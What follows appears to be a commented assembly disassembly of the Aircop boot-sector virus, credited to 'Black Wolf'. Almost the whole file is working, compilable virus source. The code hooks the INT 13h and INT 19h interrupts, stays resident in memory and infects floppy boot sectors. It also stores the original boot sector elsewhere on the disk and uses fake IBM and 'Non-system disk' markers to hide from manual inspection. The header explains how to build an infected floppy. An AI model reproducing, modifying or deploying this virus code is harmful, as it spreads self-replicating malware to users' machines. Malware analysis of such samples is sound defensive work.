

;***************************************************************************
;*                       Aircop Virus (NG-C Variant)                       *
;***************************************************************************
;*    The Aircop virus is a resident boot sector infector that fits on one *
;*sector.  It stores the old boot sector at the end of the disk.  The only *
;*thing other than replicate that the virus does is print "This is Aircop" *
;*in blinking white EVERY time the disk is accessed during the month of    *
;*September.  This quickly becomes a great annoyance.                      *
;*                                                                         *
;*     This disassembly compiles into a .COM memory image of the Aircop    *
;*virus.  To create an infected floppy, it must be placed onto the boot    *
;*sector of the disk after the original bootsector has been copied to its  *
;*"Post-Infection" position.                                               *
;*                                                                         *
;*                    Disassembly by Black Wolf.                           *
;***************************************************************************

.model tiny  
.radix 16
.code

;***************************************************************************
;*     When the virus first executes, it will be at the location 0000:7C00.*
;*As a result, any absolute addressing must be based off of this.  Also,   *
;*because the stack goes down in location from where it begins, it must    *
;*be started just below the virus in memory.                               *
;***************************************************************************
		
		org     100h
start:
		jmp     short Start_Virus
		nop
;***************************************************************************
;* Most of the following bytes remain intact on the bootsector when it is  *
;* infected.  This helps prevent manual detection (without an AV program). *
;***************************************************************************
		db      'IBM  3.3'
		db       0,2,2,1,0,2,70,0,0D0,2,0FDh,2,0,9,0,2,0
		db      13 dup (0)
		db      12,0,0,0,0,1,0

;**************************************************************************
;*      This is the beginning of the actual viral code (after the jump).  *
;**************************************************************************
Start_Virus:
		cli                           ;Clear interrupt flag for  
					      ;Stack manipulation
		xor     ax,ax
		mov     ds,ax                 ;Set DS = 0 ( = CS)  
		mov     ss,ax
		mov     bx,7C00h              ;Set stack = 0:7c00 
		mov     sp,bx                 ;(Stack goes under boot sector)
		
		push    ds
		push    bx
		
		dec     word ptr ds:[413]     ;Decrement total BIOS memory
		
		int     12h                   ;Put Low Memory in K into AX
		mov     cl,6                    
		shl     ax,cl                 ;multiply by 64
		mov     es,ax                 ;Get free segment at top of
					      ;lower 640k

Hook_Int_13:                                              ;Hook Int 13
		xchg    ax,word ptr ds:[4e]               ;(Low Level Disk)
		mov     word ptr ds:[7b00+Int_13_Seg],ax  ;Adjust by 7b00
							  ;because compiling
							  ;location is the
							  ;offset+100.
		mov     ax,offset (Int_13-100)               
		xchg    ax,word ptr ds:[4c]           
		mov     word ptr ds:[7b00+Int_13_Off],ax  

Hook_Int_19:                
		mov     ax,es                            ;Hook Int 19
		xchg    ax,word ptr ds:[66]              ;(Bootstrap Loader)
		mov     word ptr ds:[7b00+Int_19_Seg],ax
		mov     ax,offset (Int_19-start)
		xchg    ax,word ptr ds:[64]              
		mov     word ptr ds:[7b00+Int_19_Off],ax
		
		xor     di,di                   ;Start at free_seg:0
		mov     si,bx                   ;DS:SI = 0000:7C00
		mov     cx,(end_virus-start)/2  ;Virus size in words
		cld                             ;Clear direction
		rep     movsw                   ;Copy virus into "high" mem
		
		sti                             ;Re-enable interrupts
		
		push    es                      ;push virus segment
		
		mov     ax,offset High_Mem_Jump-100 

		push    ax                      ;push virus offset (H_M_J)
		
		retf                            ;retf = pop IP, pop CS
						;This jumps to the 
						;copy of virus in upper 
						;upper memory at the location
						;of High_Mem_Jump.

;***************************************************************************
;*     At this point, the virus is in memory and the code is being executed*                
;*at the highest available location under 640k (A000:0000).  It is now at  *
;*an offset of 0 rather than the earlier 7C00, so absolute addressing      *
;*within the virus must be adjusted by -100h (Origin point in a .COM).     *
;***************************************************************************

High_Mem_Jump:
		push    bx
		xor     dl,dl
		call    Check_it
		
		pop     bx
		push    ds
		pop     es
		mov     ah,2
		mov     dh,1
		call    Setup_Four      ;Call Int 13 to read original boot
		jc      Setup_Retf
		
		push    cs
		pop     ds
		mov     si,0bh
		mov     di,7c0bh
		mov     cx,2Bh
		cld                     ;Is the disk infected?
		repe    cmpsb
		
		jz      Return_Far       ;Yes, boot disk, otherwise say that
					 ;disk is a non-system disk so that 
					 ;the user will put in another one.

Setup_Retf:
		pop     bx
		pop     ax
		push    cs
		mov     ax,offset (Non_System-100)
		push    ax
  
Return_Far:
		retf                          ;Jump to Non_System

Non_System:
		push    cs
		pop     ds
		mov     si,offset ds:[Fake_Error-start]
		call    Display_Message         ;Display the "Non-system          
						;disk or disk error" message
		xor     ah,ah                   
		int     16h                     ;Get character from keyboard

Int_19:                                                
		xor     ax,ax
		int     13                      ;Reset Disk

		push    cs
		pop     es
		mov     bx,offset ds:[end_virus-start]
		mov     cx,6
		xor     dx,dx
		mov     ax,201h
		int     13h                     ;Read sector
			   
		jc      Non_System              ;Error, try again.
		mov     cx,0FF0h
		mov     ds,cx
		jmp     dword ptr cs:[Int_19_Off-start]

Display_Message:

Get_Char:
		mov     bx,7
		cld
		lodsb                        ;Get a character
		or      al,al
		jz      Return_After_Int_13  ;Zero? End of string
		jns     Set_Attribute
		xor     al,0D7h              ;Unencrypt byte
		or      bl,88h               ;Set attrib

Set_Attribute:                               ;This sections is basically   
					     ;used just to set the attribute
					     ;of the character, as the letter
					     ;is printed again regardless.

		cmp     al,20h               ;Is it a space, a carriage
					     ;return, or a linefeed?
		jbe     Print_Teletype       ;If so, go Print_Teletype
		mov     cx,1                 ;One character
		mov     ah,9 
		int     10h                  ;Display character and attribute
						
Print_Teletype:
		mov     ah,0Eh
		int     10h                  ;Write char in teletype mode
		jmp     short Get_Char
  
Check_it:
		mov     bx,offset [end_virus-start]
		mov     cx,2
		mov     ah,cl
		call    Setup_Three           ;Read sector two of A
		mov     cx,2709h              ;CX=2709 means infected (maybe?)
		xor     byte ptr es:[bx],0FDh ;
		jz      Jump_to_Return
		mov     cx,4F0Fh              ;Not infected  

Jump_to_Return:
		jmp     short Return_After_Int_13
		nop
  

Setup_One:
		mov     ah,2                            ;Read sector
		mov     bx,offset (end_virus-start)     ;To end of virus in
							; memory.
Setup_Two:
		mov     cx,1                            ;First sector
Setup_Three:
		mov     dh,0                            ;Head 0
Setup_Four:
		mov     al,1                            ;One sector

Call_Int_13:
		pushf                                   ;Fake an INT call
		call    dword ptr cs:[Int_13_Off-100]

Return_After_Int_13:
		ret

Int_13:
		push    ax bx cx dx es ds si di
		pushf
		push    cs
		pop     ds

		cmp     dl,1                    ;Is the disk a floppy?
		ja      Activation              ;No? jump to Activation
		
		and     ax,0FE00
		jz      Activation
		
		xchg    al,ch                   ;Number of sectors
		shl     al,1                    
		add     al,dh                   
		mov     ah,9                    
		mul     ah                      ;Random algorithm to decide
		add     ax,cx                   ;whether or not to activate.
		sub     al,6
		cmp     ax,6                    ;Activate now?
		ja      Activation              ;If AX > 6, then yes.
		
		push    cs
		pop     es
		call    Setup_One               ;Read sector 1, head 0 to
		jc      Reset_Disk              ;end of virus.

		mov     di,43
		mov     si,243
		mov     cx,0Eh
		std
		repe    cmpsb           ;check infection        
		jz      Activation      ;Yes? goto Activation

		sub     si,cx
		sub     di,cx
		mov     cl,33
		rep     movsb
		call    Check_it
		
		push    cx
		push    bx
		call    Setup_One       ;Read bootsector
		
		mov     ah,3
		xor     bx,bx
		call    Setup_Two       ;Write virus bootsector
		
		pop     bx
		pop     cx
		jc      Reset_Disk      
		
		mov     dh,1
		mov     ah,3
		call    Setup_Four      ;Store old sector
Reset_Disk:
		xor     ax,ax
		call    Call_Int_13

Activation:
		mov     ah,4
		int     1Ah                     ;Get Real Time Clock Date
						;(Doesn't work on XT's)
			   
		cmp     dh,9                    ;Is it September?
		jne     Go_Int_13               ;Nope, Process Int 13 
						;otherwise print message

		mov     si,offset ds:[Encrypted_Mess-start]
		call    Display_Message
Go_Int_13:
		popf
		pop     di si ds es dx cx bx ax
		jmp     dword ptr cs:[Int_13_Off-start]

;****************************************************************************
;*          Storage of old Int 13 vector (absolute disk access).            *
;****************************************************************************
Int_13_Off      dw      0EC59
Int_13_Seg      dw      0F000

;****************************************************************************
;*              Storage of old Int 19 vector (Bootblock).                   *
;****************************************************************************
Int_19_Off      dw      0E6F2
Int_19_Seg      dw      0F000

;*************************************************************************
;*The following is the message "This is Aircop" encrypted by xoring each *
;*byte with D7h.                                                         *
;*************************************************************************
Encrypted_Mess  db      0DA,0DDh,20,83,0BF,0BE,0A4,0F7
		db      0BE,0A4,0F7,96,0BE,0A5,0B4,0B8,0A7,0DA,0DDh,0
;*************************************************************************
;* The following is inserted to try to convince user that it is a real   *
;*bootsector when looked at.                                             *
;*************************************************************************
Fake_System     db      'IO      SYSMSDOS   SYS'

Fake_Error      db       0Dh,0A,'Non-system disk or disk error',0Dh,0A
		db       00h, 00h 
		
Boot_Sec_Mark   db      55h,0AAh                ;Tells BIOS that this is a
						;legit. bootsector.
end_virus:
end     start

